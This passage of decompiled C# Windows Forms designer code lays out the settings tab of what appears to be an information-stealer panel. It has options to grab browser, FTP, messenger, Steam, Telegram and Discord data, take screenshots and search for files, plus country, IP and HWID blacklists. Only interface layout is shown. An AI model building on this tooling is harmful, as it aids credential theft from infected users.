		((System.Windows.Forms.Control)this.metroSetDivider11).Size = new System.Drawing.Size(1273, 4);
		((MetroSetDivider)this.metroSetDivider11).Style = (Style)1;
		((MetroSetDivider)this.metroSetDivider11).StyleManager = null;
		((System.Windows.Forms.Control)this.metroSetDivider11).TabIndex = 140;
		((System.Windows.Forms.Control)this.metroSetDivider11).Text = "metroSetDivider11";
		((MetroSetDivider)this.metroSetDivider11).ThemeAuthor = "Narwin";
		((MetroSetDivider)this.metroSetDivider11).ThemeName = "MetroDark";
		((MetroSetDivider)this.metroSetDivider11).Thickness = 1;
		((MetroSetButton)this.metroSetButton2).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.metroSetButton2).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.metroSetButton2).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.metroSetButton2).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.metroSetButton2).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.metroSetButton2).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.metroSetButton2).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.metroSetButton2).Location = new System.Drawing.Point(515, 608);
		((System.Windows.Forms.Control)this.metroSetButton2).Name = "metroSetButton2";
		((MetroSetButton)this.metroSetButton2).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.metroSetButton2).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.metroSetButton2).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.metroSetButton2).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.metroSetButton2).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.metroSetButton2).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.metroSetButton2).Size = new System.Drawing.Size(133, 23);
		((MetroSetButton)this.metroSetButton2).Style = (Style)0;
		((MetroSetButton)this.metroSetButton2).StyleManager = null;
		((System.Windows.Forms.Control)this.metroSetButton2).TabIndex = 139;
		((System.Windows.Forms.Control)this.metroSetButton2).Text = "Save settings";
		((MetroSetButton)this.metroSetButton2).ThemeAuthor = "Narwin";
		((MetroSetButton)this.metroSetButton2).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.metroSetButton2).Click += new System.EventHandler(saveSettingsBtn_Click);
		((MetroSetButton)this.importHWIDs).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.importHWIDs).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.importHWIDs).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.importHWIDs).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.importHWIDs).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.importHWIDs).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.importHWIDs).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.importHWIDs).Location = new System.Drawing.Point(705, 401);
		((System.Windows.Forms.Control)this.importHWIDs).Name = "importHWIDs";
		((MetroSetButton)this.importHWIDs).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.importHWIDs).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.importHWIDs).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.importHWIDs).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.importHWIDs).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.importHWIDs).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.importHWIDs).Size = new System.Drawing.Size(75, 23);
		((MetroSetButton)this.importHWIDs).Style = (Style)0;
		((MetroSetButton)this.importHWIDs).StyleManager = null;
		((System.Windows.Forms.Control)this.importHWIDs).TabIndex = 138;
		((System.Windows.Forms.Control)this.importHWIDs).Text = "From File";
		((MetroSetButton)this.importHWIDs).ThemeAuthor = "Narwin";
		((MetroSetButton)this.importHWIDs).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.importHWIDs).Click += new System.EventHandler(importHWIDs_Click);
		((MetroSetButton)this.addBlackHwidBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.addBlackHwidBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.addBlackHwidBtn).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.addBlackHwidBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.addBlackHwidBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.addBlackHwidBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.addBlackHwidBtn).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.addBlackHwidBtn).Location = new System.Drawing.Point(705, 427);
		((System.Windows.Forms.Control)this.addBlackHwidBtn).Name = "addBlackHwidBtn";
		((MetroSetButton)this.addBlackHwidBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.addBlackHwidBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.addBlackHwidBtn).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.addBlackHwidBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.addBlackHwidBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.addBlackHwidBtn).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.addBlackHwidBtn).Size = new System.Drawing.Size(75, 23);
		((MetroSetButton)this.addBlackHwidBtn).Style = (Style)0;
		((MetroSetButton)this.addBlackHwidBtn).StyleManager = null;
		((System.Windows.Forms.Control)this.addBlackHwidBtn).TabIndex = 137;
		((System.Windows.Forms.Control)this.addBlackHwidBtn).Text = "Add";
		((MetroSetButton)this.addBlackHwidBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)this.addBlackHwidBtn).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.addBlackHwidBtn).Click += new System.EventHandler(addBlackHwidBtn_Click);
		((AnimaTextBox)this.blackHwidTb).Dark = false;
		((System.Windows.Forms.Control)this.blackHwidTb).Location = new System.Drawing.Point(587, 427);
		((AnimaTextBox)this.blackHwidTb).MaxLength = 32767;
		((AnimaTextBox)this.blackHwidTb).MultiLine = false;
		((System.Windows.Forms.Control)this.blackHwidTb).Name = "blackHwidTb";
		((AnimaTextBox)this.blackHwidTb).Numeric = false;
		((AnimaTextBox)this.blackHwidTb).ReadOnly = false;
		((System.Windows.Forms.Control)this.blackHwidTb).Size = new System.Drawing.Size(112, 23);
		((System.Windows.Forms.Control)this.blackHwidTb).TabIndex = 136;
		((AnimaTextBox)this.blackHwidTb).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.label43).AutoSize = true;
		((System.Windows.Forms.Control)this.label43).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label43).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.label43).Location = new System.Drawing.Point(584, 409);
		((System.Windows.Forms.Control)this.label43).Name = "label43";
		((System.Windows.Forms.Control)this.label43).Size = new System.Drawing.Size(80, 15);
		((System.Windows.Forms.Control)this.label43).TabIndex = 135;
		((System.Windows.Forms.Control)this.label43).Text = "Enter a HWID:";
		((System.Windows.Forms.Control)this.blackListHWIDsLb).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.ListBox)this.blackListHWIDsLb).BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		((System.Windows.Forms.Control)this.blackListHWIDsLb).ContextMenuStrip = (System.Windows.Forms.ContextMenuStrip)this.blackListCms_6;
		((System.Windows.Forms.Control)this.blackListHWIDsLb).Cursor = System.Windows.Forms.Cursors.Default;
		((System.Windows.Forms.Control)this.blackListHWIDsLb).Font = new System.Drawing.Font("Consolas", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.blackListHWIDsLb).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.ListBox)this.blackListHWIDsLb).HorizontalScrollbar = true;
		((System.Windows.Forms.ListBox)this.blackListHWIDsLb).ItemHeight = 18;
		((System.Windows.Forms.Control)this.blackListHWIDsLb).Location = new System.Drawing.Point(587, 211);
		((System.Windows.Forms.Control)this.blackListHWIDsLb).Name = "blackListHWIDsLb";
		((System.Windows.Forms.Control)this.blackListHWIDsLb).Size = new System.Drawing.Size(193, 182);
		((System.Windows.Forms.Control)this.blackListHWIDsLb).TabIndex = 134;
		((System.Windows.Forms.Control)this.label44).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label44).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.label44).Location = new System.Drawing.Point(587, 178);
		((System.Windows.Forms.Control)this.label44).Name = "label44";
		((System.Windows.Forms.Control)this.label44).Size = new System.Drawing.Size(193, 30);
		((System.Windows.Forms.Control)this.label44).TabIndex = 133;
		((System.Windows.Forms.Control)this.label44).Text = "Black list HWIDs:";
		((System.Windows.Forms.Label)this.label44).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetButton)this.importIPs).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.importIPs).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.importIPs).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.importIPs).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.importIPs).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.importIPs).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.importIPs).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.importIPs).Location = new System.Drawing.Point(471, 401);
		((System.Windows.Forms.Control)this.importIPs).Name = "importIPs";
		((MetroSetButton)this.importIPs).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.importIPs).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.importIPs).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.importIPs).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.importIPs).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.importIPs).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.importIPs).Size = new System.Drawing.Size(75, 23);
		((MetroSetButton)this.importIPs).Style = (Style)0;
		((MetroSetButton)this.importIPs).StyleManager = null;
		((System.Windows.Forms.Control)this.importIPs).TabIndex = 132;
		((System.Windows.Forms.Control)this.importIPs).Text = "From File";
		((MetroSetButton)this.importIPs).ThemeAuthor = "Narwin";
		((MetroSetButton)this.importIPs).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.importIPs).Click += new System.EventHandler(importIPs_Click);
		((MetroSetButton)this.addBlackIPBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.addBlackIPBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.addBlackIPBtn).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.addBlackIPBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.addBlackIPBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.addBlackIPBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.addBlackIPBtn).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.addBlackIPBtn).Location = new System.Drawing.Point(471, 427);
		((System.Windows.Forms.Control)this.addBlackIPBtn).Name = "addBlackIPBtn";
		((MetroSetButton)this.addBlackIPBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.addBlackIPBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.addBlackIPBtn).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.addBlackIPBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.addBlackIPBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.addBlackIPBtn).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.addBlackIPBtn).Size = new System.Drawing.Size(75, 23);
		((MetroSetButton)this.addBlackIPBtn).Style = (Style)0;
		((MetroSetButton)this.addBlackIPBtn).StyleManager = null;
		((System.Windows.Forms.Control)this.addBlackIPBtn).TabIndex = 131;
		((System.Windows.Forms.Control)this.addBlackIPBtn).Text = "Add";
		((MetroSetButton)this.addBlackIPBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)this.addBlackIPBtn).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.addBlackIPBtn).Click += new System.EventHandler(addBlackIPBtn_Click);
		((AnimaTextBox)this.blackIPTb).Dark = false;
		((System.Windows.Forms.Control)this.blackIPTb).Location = new System.Drawing.Point(353, 427);
		((AnimaTextBox)this.blackIPTb).MaxLength = 32767;
		((AnimaTextBox)this.blackIPTb).MultiLine = false;
		((System.Windows.Forms.Control)this.blackIPTb).Name = "blackIPTb";
		((AnimaTextBox)this.blackIPTb).Numeric = false;
		((AnimaTextBox)this.blackIPTb).ReadOnly = false;
		((System.Windows.Forms.Control)this.blackIPTb).Size = new System.Drawing.Size(112, 23);
		((System.Windows.Forms.Control)this.blackIPTb).TabIndex = 130;
		((AnimaTextBox)this.blackIPTb).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.label23).AutoSize = true;
		((System.Windows.Forms.Control)this.label23).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label23).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.label23).Location = new System.Drawing.Point(350, 409);
		((System.Windows.Forms.Control)this.label23).Name = "label23";
		((System.Windows.Forms.Control)this.label23).Size = new System.Drawing.Size(66, 15);
		((System.Windows.Forms.Control)this.label23).TabIndex = 129;
		((System.Windows.Forms.Control)this.label23).Text = "Enter an IP:";
		((System.Windows.Forms.Control)this.blackListIPsLb).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.ListBox)this.blackListIPsLb).BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		((System.Windows.Forms.Control)this.blackListIPsLb).ContextMenuStrip = (System.Windows.Forms.ContextMenuStrip)this.e0;
		((System.Windows.Forms.Control)this.blackListIPsLb).Cursor = System.Windows.Forms.Cursors.Default;
		((System.Windows.Forms.Control)this.blackListIPsLb).Font = new System.Drawing.Font("Consolas", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.blackListIPsLb).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.ListBox)this.blackListIPsLb).HorizontalScrollbar = true;
		((System.Windows.Forms.ListBox)this.blackListIPsLb).ItemHeight = 18;
		((System.Windows.Forms.Control)this.blackListIPsLb).Location = new System.Drawing.Point(353, 211);
		((System.Windows.Forms.Control)this.blackListIPsLb).Name = "blackListIPsLb";
		((System.Windows.Forms.Control)this.blackListIPsLb).Size = new System.Drawing.Size(193, 182);
		((System.Windows.Forms.Control)this.blackListIPsLb).TabIndex = 128;
		((System.Windows.Forms.Control)this.label24).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label24).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.label24).Location = new System.Drawing.Point(353, 178);
		((System.Windows.Forms.Control)this.label24).Name = "label24";
		((System.Windows.Forms.Control)this.label24).Size = new System.Drawing.Size(193, 30);
		((System.Windows.Forms.Control)this.label24).TabIndex = 127;
		((System.Windows.Forms.Control)this.label24).Text = "Black list IPs:";
		((System.Windows.Forms.Label)this.label24).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetButton)this.addBlackCountryBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.addBlackCountryBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.addBlackCountryBtn).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.addBlackCountryBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.addBlackCountryBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.addBlackCountryBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.addBlackCountryBtn).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.addBlackCountryBtn).Location = new System.Drawing.Point(241, 427);
		((System.Windows.Forms.Control)this.addBlackCountryBtn).Name = "addBlackCountryBtn";
		((MetroSetButton)this.addBlackCountryBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.addBlackCountryBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.addBlackCountryBtn).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.addBlackCountryBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.addBlackCountryBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.addBlackCountryBtn).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.addBlackCountryBtn).Size = new System.Drawing.Size(75, 23);
		((MetroSetButton)this.addBlackCountryBtn).Style = (Style)0;
		((MetroSetButton)this.addBlackCountryBtn).StyleManager = null;
		((System.Windows.Forms.Control)this.addBlackCountryBtn).TabIndex = 126;
		((System.Windows.Forms.Control)this.addBlackCountryBtn).Text = "Add";
		((MetroSetButton)this.addBlackCountryBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)this.addBlackCountryBtn).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.addBlackCountryBtn).Click += new System.EventHandler(addBlackCountryBtn_Click);
		((AnimaTextBox)this.blackCountryTb).Dark = false;
		((System.Windows.Forms.Control)this.blackCountryTb).Location = new System.Drawing.Point(114, 427);
		((AnimaTextBox)this.blackCountryTb).MaxLength = 32767;
		((AnimaTextBox)this.blackCountryTb).MultiLine = false;
		((System.Windows.Forms.Control)this.blackCountryTb).Name = "blackCountryTb";
		((AnimaTextBox)this.blackCountryTb).Numeric = false;
		((AnimaTextBox)this.blackCountryTb).ReadOnly = false;
		((System.Windows.Forms.Control)this.blackCountryTb).Size = new System.Drawing.Size(112, 23);
		((System.Windows.Forms.Control)this.blackCountryTb).TabIndex = 125;
		((AnimaTextBox)this.blackCountryTb).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.blackCountryLbl).AutoSize = true;
		((System.Windows.Forms.Control)this.blackCountryLbl).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.blackCountryLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.blackCountryLbl).Location = new System.Drawing.Point(117, 409);
		((System.Windows.Forms.Control)this.blackCountryLbl).Name = "blackCountryLbl";
		((System.Windows.Forms.Control)this.blackCountryLbl).Size = new System.Drawing.Size(90, 15);
		((System.Windows.Forms.Control)this.blackCountryLbl).TabIndex = 124;
		((System.Windows.Forms.Control)this.blackCountryLbl).Text = "Enter a country:";
		((System.Windows.Forms.Control)this.blackListLb).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.ListBox)this.blackListLb).BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		((System.Windows.Forms.Control)this.blackListLb).ContextMenuStrip = (System.Windows.Forms.ContextMenuStrip)this.blackListCms_2;
		((System.Windows.Forms.Control)this.blackListLb).Cursor = System.Windows.Forms.Cursors.Default;
		((System.Windows.Forms.Control)this.blackListLb).Font = new System.Drawing.Font("Consolas", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.blackListLb).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.ListBox)this.blackListLb).HorizontalScrollbar = true;
		((System.Windows.Forms.ListBox)this.blackListLb).ItemHeight = 18;
		((System.Windows.Forms.Control)this.blackListLb).Location = new System.Drawing.Point(114, 211);
		((System.Windows.Forms.Control)this.blackListLb).Name = "blackListLb";
		((System.Windows.Forms.Control)this.blackListLb).Size = new System.Drawing.Size(202, 182);
		((System.Windows.Forms.Control)this.blackListLb).TabIndex = 123;
		((System.Windows.Forms.Control)this.blackListLbl).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.blackListLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.blackListLbl).Location = new System.Drawing.Point(118, 178);
		((System.Windows.Forms.Control)this.blackListLbl).Name = "blackListLbl";
		((System.Windows.Forms.Control)this.blackListLbl).Size = new System.Drawing.Size(198, 30);
		((System.Windows.Forms.Control)this.blackListLbl).TabIndex = 122;
		((System.Windows.Forms.Control)this.blackListLbl).Text = "Black list countries:";
		((System.Windows.Forms.Label)this.blackListLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.settingsTab).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.metroSetButton4);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.label45);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.discordCb);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.chooseAutosaveDirectory);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.autosaveDirTb);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.label40);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.screenshotLbl);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.screenshotCb);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.telegramLbl);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.telegramCb);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.steamLbl);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.steamCb);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.vpnLbl);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.vpnCb);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.e2);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.e3);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.d4);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.d5);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.d6);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.d7);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.domainDetectorLb);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.da);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.d3);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.cf);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.d0);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.c8);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.c9);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.duplicateLbl);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.duplicateCb);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider10);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.saveSettingsBtn);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.addSearchPatternBtn);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.searchPatternTb);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.searchPatternLbl);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.getFilesSettingsLb);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.getFilesSettingsLbl);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.grabFilesLbl);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.grabFilesCb);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.grabImClientsLbl);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.grabImClientsCb);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.grabFtpsLbl);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.grabFtpsCb);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.grabBrowsersLbl);
		((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.grabBrowsersCb);
		((System.Windows.Forms.Control)this.settingsTab).Font = new System.Drawing.Font("Segoe UI", 9f);
		((System.Windows.Forms.Control)this.settingsTab).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.TabPage)this.settingsTab).Location = new System.Drawing.Point(194, 4);
		((System.Windows.Forms.Control)this.settingsTab).Name = "settingsTab";
		((System.Windows.Forms.Control)this.settingsTab).Size = new System.Drawing.Size(1168, 639);
		((System.Windows.Forms.TabPage)this.settingsTab).TabIndex = 5;
		((System.Windows.Forms.Control)this.settingsTab).Text = "Settings";
		((MetroSetButton)this.metroSetButton4).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.metroSetButton4).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.metroSetButton4).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.metroSetButton4).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.metroSetButton4).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.metroSetButton4).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.metroSetButton4).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.metroSetButton4).Location = new System.Drawing.Point(297, 273);
		((System.Windows.Forms.Control)this.metroSetButton4).Name = "metroSetButton4";
		((MetroSetButton)this.metroSetButton4).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.metroSetButton4).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.metroSetButton4).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.metroSetButton4).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.metroSetButton4).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
